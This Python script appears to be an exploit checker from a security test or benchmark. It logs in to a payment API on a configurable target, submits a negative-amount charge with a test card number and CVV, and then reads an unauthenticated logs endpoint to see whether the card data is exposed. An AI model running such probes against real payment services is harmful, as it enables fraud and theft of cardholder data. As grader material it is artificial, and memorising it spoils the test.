import os, sys, requests

BASE = os.environ.get('TARGET_URL', 'http://localhost:8080').rstrip('/')
PAN = '4111111111111111'
CVV = '123'

def verdict(ok, msg):
    print(('EXPLOIT_SUCCESS: ' if ok else 'EXPLOIT_FAIL: ') + msg.replace('\n', ' ')[:300])
    sys.exit(0)

try:
    s = requests.Session()
    r = s.post(f'{BASE}/api/auth/login', json={'Username': 'alice', 'Password': 'alice-pw'}, timeout=3)
    if r.status_code != 200:
        verdict(False, f'login failed status={r.status_code}')
    token = r.json().get('token')
    if not token:
        verdict(False, 'no token returned from login')
    headers = {'Authorization': f'Bearer {token}'}
    rc = s.post(f'{BASE}/api/payments/charge', json={'Amount': -9999.99, 'Pan': PAN, 'Cvv': CVV}, headers=headers, timeout=3)
    if rc.status_code != 200:
        verdict(False, f'charge failed status={rc.status_code}')
    rl = s.get(f'{BASE}/api/payments/logs', timeout=3)
    if rl.status_code != 200:
        verdict(False, f'logs endpoint status={rl.status_code}')
    body = rl.text
    if PAN in body and CVV in body:
        line = next((ln for ln in body.splitlines() if PAN in ln), body[:200])
        verdict(True, f'Card PAN/CVV visible in log entry: {line.strip()}')
    elif PAN in body:
        line = next((ln for ln in body.splitlines() if PAN in ln), body[:200])
        verdict(True, f'Card PAN visible in log entry: {line.strip()}')
    else:
        verdict(False, f'marker not found in logs (len={len(body)})')
except requests.RequestException as e:
    verdict(False, f'request error: {e}')
except Exception as e:
    verdict(False, f'unexpected error: {e}')

